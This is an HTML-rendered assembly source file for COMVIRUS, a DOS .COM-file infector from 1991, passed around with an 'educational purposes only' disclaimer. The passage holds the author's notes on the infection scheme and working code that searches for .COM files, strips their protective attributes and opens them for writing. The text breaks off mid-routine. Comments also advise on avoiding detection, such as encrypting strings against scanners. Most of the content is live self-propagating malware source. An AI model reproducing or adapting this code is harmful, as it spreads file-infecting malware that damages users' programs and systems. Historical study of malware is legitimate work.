<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>COMVIRUS.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">title</span><span class="sc0"> </span><span class="sc5">COMVIRUS</span><span class="sc0">
</span><span class="sc9">subttl</span><span class="sc0"> </span><span class="sc5">By</span><span class="sc0"> </span><span class="sc5">Drew</span><span class="sc0"> </span><span class="sc5">Eckhardt</span><span class="sc0">
</span><span class="sc9">subttl</span><span class="sc0"> </span><span class="sc5">Latest</span><span class="sc0"> </span><span class="sc5">revision</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">-</span><span class="sc2">1991</span><span class="sc0">

</span><span class="sc1">;The author of this virus intends it to be used for educational</span><span class="sc0">
</span><span class="sc1">;purposes only, and assumes no responsibilities for its release,</span><span class="sc0">
</span><span class="sc1">;dammages resulting from its use, including but not limited to</span><span class="sc0">
</span><span class="sc1">;equipment dammage or data loss.</span><span class="sc0">

</span><span class="sc1">;By assembling or examining this program, The user agrees to accept all</span><span class="sc0">
</span><span class="sc1">;responsibility for this programs use, or any portions of the code</span><span class="sc0">
</span><span class="sc1">;or concepts contained within.  The user also agrees to not publicly release</span><span class="sc0">
</span><span class="sc1">;this virus, and to exercise necessary precautions to prevent its escape.</span><span class="sc0">
</span><span class="sc1">;The user accepts all responsibility arising from his actions.</span><span class="sc0">

</span><span class="sc1">;Don't come crying to me if your hard disk gets infected,</span><span class="sc0">
</span><span class="sc1">;as THERE IS NO ANTIDOTE.  HAHAHAH.</span><span class="sc0">


</span><span class="sc1">;Revision history:</span><span class="sc0">
</span><span class="sc1">;4-13: initial bug-free release, size=424 bytes with carrier</span><span class="sc0">

</span><span class="sc1">;4-15: added no date change support, size=438 bytes with carrier</span><span class="sc0">

</span><span class="sc1">;4-16: minor documentation changes, size=438 bytes with carrier,</span><span class="sc0">
</span><span class="sc1">;      NO CODE CHANGE from 4-15 revision</span><span class="sc0">

</span><span class="sc1">;4-21: fixed missing hex h suffixs, made MASM friendly,</span><span class="sc0">
</span><span class="sc1">;      fixed incorrect assume statement (assume statements are ignored</span><span class="sc0">
</span><span class="sc1">;      by A86) enabled hard/floppy infection based on floppy_only status</span><span class="sc0">
</span><span class="sc1">;      size=438 bytes IF floppy_only, 424 bytes if not, with carrier.</span><span class="sc0">
</span><span class="sc1">;      minimum virus length = 419 bytes</span><span class="sc0">
    
</span><span class="sc1">;4-23: added control over how many programs are infected per run,</span><span class="sc0">
</span><span class="sc1">;      switched method of infection, from copying to DTA then writing</span><span class="sc0">
</span><span class="sc1">;      to disk to straight write to disk from memory.</span><span class="sc0">
</span><span class="sc1">;      size=412 bytes IF floppy_only, 398 bytes if not, with carrier.</span><span class="sc0">
</span><span class="sc1">;      minimum virus length = 393 bytes</span><span class="sc0">
    
</span><span class="sc1">;4-28: used set DTA instead of default DTA/copy command line</span><span class="sc0">
</span><span class="sc1">;      buffer, which had been used based on incorrect assumption</span><span class="sc0">
</span><span class="sc1">;      eliminated calls to get time/date, get attribs</span><span class="sc0">
</span><span class="sc1">;      by using information from find first/find next functions 4eh/4fh</span><span class="sc0">
</span><span class="sc1">;      made warning optional for reduced space if desired.  Also</span><span class="sc0">
</span><span class="sc1">;      changed mov reg16, bp add reg16, constant to shorter LEA instruction.</span><span class="sc0">
</span><span class="sc1">;      size=354 bytes IF floppy_only, warning on W/carrier</span><span class="sc0">
</span><span class="sc1">;           340 bytes IF w/warning &amp; carrier program</span><span class="sc0">
</span><span class="sc1">;           286 bytes w/o warning, in program</span><span class="sc0">
</span><span class="sc1">;       minimum virus length = 281 bytes for virus itself</span><span class="sc0">

</span><span class="sc1">;4-28pm:  instead of near CALL-pop sequences everywhere, switched to</span><span class="sc0">
</span><span class="sc1">;         a single CALL near ptr Reference_Point, putting the result into</span><span class="sc0">
</span><span class="sc1">;         si now that (until the end) string mode addressing is not used.</span><span class="sc0">
</span><span class="sc1">;         Changed places where a register (used as an index)</span><span class="sc0">
</span><span class="sc1">;         was being loaded THEN added to a single LEA isntruction</span><span class="sc0">
</span><span class="sc1">;       size = 340 bytes if floppy_only, warning on w/carrier</span><span class="sc0">
</span><span class="sc1">;       size = 326 bytes if w/warning &amp; carrier</span><span class="sc0">
</span><span class="sc1">;   size = 272 w/o warning</span><span class="sc0">
</span><span class="sc1">;   minimum virus length = 267 bytes for the virus itself</span><span class="sc0">

</span><span class="sc1">;4-28pm2: Eliminated unecessary flush buffers call.</span><span class="sc0">
</span><span class="sc1">;       size = 336 bytes if floppy_only w/carrier</span><span class="sc0">
</span><span class="sc1">;       size = 322 bytes w/warning &amp; carrier</span><span class="sc0">
</span><span class="sc1">;   size = 268 w/o warning</span><span class="sc0">
</span><span class="sc1">;   minimum virus length = 263 bytes for virus itself</span><span class="sc0">

</span><span class="sc1">;4-30:  restored 5 bytes of original code at CS:0100</span><span class="sc0">
</span><span class="sc1">;   before infecting other programs, allowing the</span><span class="sc0">
</span><span class="sc1">;   original code field to be modified so one disk write could be</span><span class="sc0">
</span><span class="sc1">;   used instead of two</span><span class="sc0">
</span><span class="sc1">;   minor documentation revisions - corrected incorrect</span><span class="sc0">
</span><span class="sc1">;   opcodes in documentation</span><span class="sc0">
</span><span class="sc1">;   size = 326 bytes if floppy_only w/carrier</span><span class="sc0">
</span><span class="sc1">;   size = 312 bytes w/warning &amp; carrier program</span><span class="sc0">
</span><span class="sc1">;   size = 258 bytes w/carrier program</span><span class="sc0">
</span><span class="sc1">;   Minimum virus length = 253 bytes for the virus itself</span><span class="sc0">
    
</span><span class="sc1">;NOTE:  The program is currently "set up" for A86 assembly with all</span><span class="sc0">
</span><span class="sc1">;conditional assembly symbols.  #IF and #ENDIF should be replaced with</span><span class="sc0">
</span><span class="sc1">;MASM IFDEF and ENDIF directives for propper operation.</span><span class="sc0">
</span><span class="sc1">;Also, instead of using EQUates to define control symbols, the /D</span><span class="sc0">
</span><span class="sc1">;option or DEFINE could be used.....</span><span class="sc0">


</span><span class="sc1">;COMVIRUS.ASM must be assembled into a .COM file inorder to function</span><span class="sc0">
</span><span class="sc1">;properly.  For convieniece, I recommend an assembler like A86 that will</span><span class="sc0">
</span><span class="sc1">;assemble to a .COM file without having to go through LINK and EXE2BIN</span><span class="sc0">

</span><span class="sc1">;As is, it will infect .COM files located on the current disk.</span><span class="sc0">
</span><span class="sc1">;ONLY if it is a floppy disk, ONLY in the root directory.</span><span class="sc0">

</span><span class="sc1">;This is a .COM infector virus, which, does nothing other than print a</span><span class="sc0">
</span><span class="sc1">;warning message, and spread to all files on the default disk IFF it is</span><span class="sc0">
</span><span class="sc1">;a floppy disk, in the root directory.</span><span class="sc0">

</span><span class="sc1">;Theory:</span><span class="sc0">
</span><span class="sc1">;This is a non - overwriting virus.  I took special precautions to preserve</span><span class="sc0">
</span><span class="sc1">;all functionality of the original program, including command line, parsed FCB,</span><span class="sc0">
</span><span class="sc1">;and segment register preservation.  This makes the virus harder to detect.</span><span class="sc0">

</span><span class="sc1">;The .COM file is a memory image - with no relocation table.  Thus, it</span><span class="sc0">
</span><span class="sc1">;is an easy target for a virus such as this.</span><span class="sc0">

</span><span class="sc1">;Infected file format</span><span class="sc0">
</span><span class="sc1">;jmp near ptr xxxx</span><span class="sc0">
</span><span class="sc1">;cli cli                ;ID bytes</span><span class="sc0">
</span><span class="sc1">;ORIGINAL program code, sans 5 bytes</span><span class="sc0">
</span><span class="sc1">;5 bytes ORIGINAL program code</span><span class="sc0">
</span><span class="sc1">;VIRUS</span><span class="sc0">

</span><span class="sc1">;This format makes infection VERY simple.  We merely check for our signature</span><span class="sc0">
</span><span class="sc1">;(in this case cli cli (fa fa) - instructions that no programmer in his</span><span class="sc0">
</span><span class="sc1">;right mind would use - loading the original five bytes in the process.</span><span class="sc0">
</span><span class="sc1">;These original bytes are written to the end of the program, then</span><span class="sc0">
</span><span class="sc1">;A jump to where the virus is.</span><span class="sc0">

</span><span class="sc1">;While infection is easy, this method presents some coding problems, as the</span><span class="sc0">
</span><span class="sc1">;virus does not know where in memory it is.  Therefor, When we want to access</span><span class="sc0">
</span><span class="sc1">;data, we FIND OUT where we are, by performing a near call which PUSHES ip to the</span><span class="sc0">
</span><span class="sc1">;stack which is then popped.  Addresses are then calculated relative to this</span><span class="sc0">
</span><span class="sc1">;via LEA</span><span class="sc0">

</span><span class="sc1">;To run the program as normal, command line is restored, registers restored,</span><span class="sc0">
</span><span class="sc1">;And original code copied onto the first five bytes of the program.</span><span class="sc0">


</span><span class="sc1">;Program control symbols defined here</span><span class="sc0">
</span><span class="sc5">floppy_only</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">infect_per_run</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;number of programs infected per run</span><span class="sc0">
</span><span class="sc5">warn_user</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;This is our signature</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">

</span><span class="sc1">;Original code is the data field where we store the original program code</span><span class="sc0">
</span><span class="sc1">;which will replace our signature and jmp to infect</span><span class="sc0">

</span><span class="sc5">Original_Code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;five bytes that simply terminate</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">;the program</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">



</span><span class="sc1">;Data for the virus.  In a destructive virus, you would want to encrypt</span><span class="sc0">
</span><span class="sc1">;any strings using a simple one's complement (not) operation so as to</span><span class="sc0">
</span><span class="sc1">;thwart detection via text search utilities.  Since we want detection to</span><span class="sc0">
</span><span class="sc1">;be easy, this un-encrypted form is fine.</span><span class="sc0">


</span><span class="sc5">Start_Virus</span><span class="sc4">:</span><span class="sc0">
#</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">warn_user</span><span class="sc0">
        </span><span class="sc5">Warning</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"This file infected with COMVIRUS 1.0"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">
#</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">;VirusMask is simply an ASCIIZ terminated string of the files we wish to</span><span class="sc0">
</span><span class="sc1">;infect.</span><span class="sc0">

        </span><span class="sc5">VirusMask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;on entry to a .COM program,                            STACK:</span><span class="sc0">
                                        </span><span class="sc1">;MS-DOS puts drive identifiers                          ax (drive id for FCB's) &lt;-- sp</span><span class="sc0">
                                        </span><span class="sc1">;for the two FCB's in here.  Save</span><span class="sc0">
                                        </span><span class="sc1">;'em</span><span class="sc0">

        </span><span class="sc1">;I use special trickery to find location of data.  Since</span><span class="sc0">
        </span><span class="sc1">;NEAR calls/jmps are RELATIVE, call near ptr find_warn is</span><span class="sc0">
    </span><span class="sc1">;translated to e8 0000 - which will simply place the location</span><span class="sc0">
    </span><span class="sc1">;of Reference onto the stack.  Our data can be found relative to</span><span class="sc0">
    </span><span class="sc1">;this point.</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Reference</span><span class="sc0">         </span><span class="sc1">;All data is reference realative to</span><span class="sc0">
                                        </span><span class="sc1">;Reference</span><span class="sc0">


</span><span class="sc5">Reference</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;which is placed into bx for LEA</span><span class="sc0">
                    </span><span class="sc1">;instructions</span><span class="sc0">
                    </span><span class="sc1">;bx now contains the REAL address of</span><span class="sc0">
                    </span><span class="sc1">;Reference</span><span class="sc0">
                    </span><span class="sc1">;si points to real address of original</span><span class="sc0">
                    </span><span class="sc1">;code field</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reference</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Original_Code</span><span class="sc4">)]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">       </span><span class="sc1">;original code is at 100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;5 bytes</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">;from start of buffer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;since BX is used in handle</span><span class="sc0">
                    </span><span class="sc1">;based DOS calls, for the remainder</span><span class="sc0">
                    </span><span class="sc1">;of the virus, si will contain the</span><span class="sc0">
                    </span><span class="sc1">;actual address of reference</span><span class="sc0">

#</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">warn_user</span><span class="sc0">

        </span><span class="sc1">;Always calculate the address of data relative to known Reference</span><span class="sc0">
        </span><span class="sc1">;Point</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reference</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Warning</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">                   </span><span class="sc1">;DO dos call, DS:DX pointing</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;to $ terminated string</span><span class="sc0">

        </span><span class="sc1">;We want to make sure that the user gets the message</span><span class="sc0">

</span><span class="sc5">WaitForKey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc0">                 </span><span class="sc1">;we will wait for a keypress</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;signifying the user has</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;seen the message.</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WaitForKey</span><span class="sc0">

#</span><span class="sc9">ENDIF</span><span class="sc0">

#</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">FLOPPY_ONLY</span><span class="sc0">

        </span><span class="sc1">;Since this is a simple demonstration virus, we will only infect</span><span class="sc0">
        </span><span class="sc1">;.COM files on the default drive IFF it is a floppy disk....</span><span class="sc0">
        </span><span class="sc1">;So, we will get information about the disk drive.</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;ds:bx returns a byte to</span><span class="sc0">
                                        </span><span class="sc1">;media descriptor</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1bh</span><span class="sc0">                 </span><span class="sc1">;get disk information                                   STACK</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;DOIT                                                   ax (drive ID's)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">  </span><span class="sc1">;see if its a hard disk                                 ds &lt;--sp</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;restore ds                                             STACK</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Floppy</span><span class="sc0">                  </span><span class="sc1">;if it was hard....                                     ax &lt;--sp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">           </span><span class="sc1">;we're nice guys and are done</span><span class="sc0">

</span><span class="sc5">Floppy</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Since it was floppy, we can go on with the infection!</span><span class="sc0">
#</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc1">;The default DTA, as is will give us problems.  The designers of</span><span class="sc0">
        </span><span class="sc1">;MickeySoft DOS decided to put default DTA at ofset 128 in</span><span class="sc0">
        </span><span class="sc1">;the PSP.  PROBLEM:  This is also where the user's precious command</span><span class="sc0">
        </span><span class="sc1">;line is, and we MUST remain undectected.  SO.... we allocate a</span><span class="sc0">
        </span><span class="sc1">;DTA buffer on the stack.  43 bytes are needed, 44 will do.</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">44</span><span class="sc0">                 </span><span class="sc1">;allocate space for findfirst/findnext DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">                  </span><span class="sc1">;set up bp as a reference to this area</span><span class="sc0">

        </span><span class="sc1">;Set the DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;point DS:DX to our area</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">                 </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc1">;Set up pointers to data in DTA</span><span class="sc0">
        </span><span class="sc5">dta</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">file_name</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">attributes</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">time_stamp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">date_stamp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;We dynamically allocate a variable to store the number of programs                     STACK</span><span class="sc0">
        </span><span class="sc1">;The virus has infected.                                                                FCB drives</span><span class="sc0">
        </span><span class="sc1">;                                                                               bp--&gt;   44 byte DTA</span><span class="sc0">
        </span><span class="sc5">infected_count</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc1">;                                                      Infected_Count</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;zero variable,                                 sp--&gt;   buffer (6 bytes)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;allocate it on the stack</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                   </span><span class="sc1">;allocate small buffer</span><span class="sc0">

        </span><span class="sc1">;Now, we begin looking for files to infect.</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reference</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusMask</span><span class="sc4">)]</span><span class="sc0">
                                        </span><span class="sc1">;DS:DX points to the search string                      STACK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4eh</span><span class="sc0">                 </span><span class="sc1">;find first matching directory entry                    FCB drives  (word)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">                </span><span class="sc1">;only default directory, FILES                         </span><span class="sc0">
                                        </span><span class="sc1">;hidden, system and normal</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;doit                                       bp--&gt;       44 byte DTA buffer</span><span class="sc0">
                                        </span><span class="sc1">;                                                       infected count (word)</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Research</span><span class="sc0">                </span><span class="sc1">;carry is clear when a file was             sp--&gt;       6 byte buffer</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nofile</span><span class="sc0">                  </span><span class="sc1">;found.</span><span class="sc0">


</span><span class="sc5">ReSearch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;All handle based DOS calls take a pointer to an ASCIIZ file name in ds:dx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc0">

</span><span class="sc1">;Since this is a virus, we want to infect files that can't be touched by</span><span class="sc0">
</span><span class="sc1">;DOS commands, this means readonly, system, and hidden files are at our</span><span class="sc0">
</span><span class="sc1">;mercy.  To do this, we rely on the findfrst/next attributes and other data</span><span class="sc0">
</span><span class="sc1">;to restore the attribute byte to the original settings.  get/SET can fix</span><span class="sc0">
</span><span class="sc1">;them to be suitable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">attributes</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">           </span><span class="sc1">;not readonly, system, or hidden                        STACK</span><span class="sc0">
                                        </span><span class="sc1">;                                                       FCB drives</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">;set attributes                              bp--&gt;      buffer (44 bytes)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;                                                       buffer (6 bytes)</span><span class="sc0">
                                        </span><span class="sc1">;                                            sp--&gt;      infected_count</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoError</span><span class="sc0">                 </span><span class="sc1">;check for error</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Restore_Flags</span><span class="sc0">
</span><span class="sc5">NoError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3d02h</span><span class="sc0">               </span><span class="sc1">;now, open file using handle,</span><span class="sc0">
                                        </span><span class="sc1">;read/write access</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoError2</span><span class="sc0">                </span><span class="sc1">;IF there was an error, we are done</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Restore_Flags</span><span class="sc0">           </span><span class="sc1">;But we don't need to commit or close</span><span class="sc0">

</span><span class="sc5">NoError2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;The handle was returned in ACC.</span><span class="sc0">
                                        </span><span class="sc1">;Howwever, all handle based DOS</span><span class="sc0">
                                        </span><span class="sc1">;calls expect it in BX</span><span class="sc0">


</span><span class="sc1">;We don't want to infect the program more than once, so we will</span><span class="sc0">
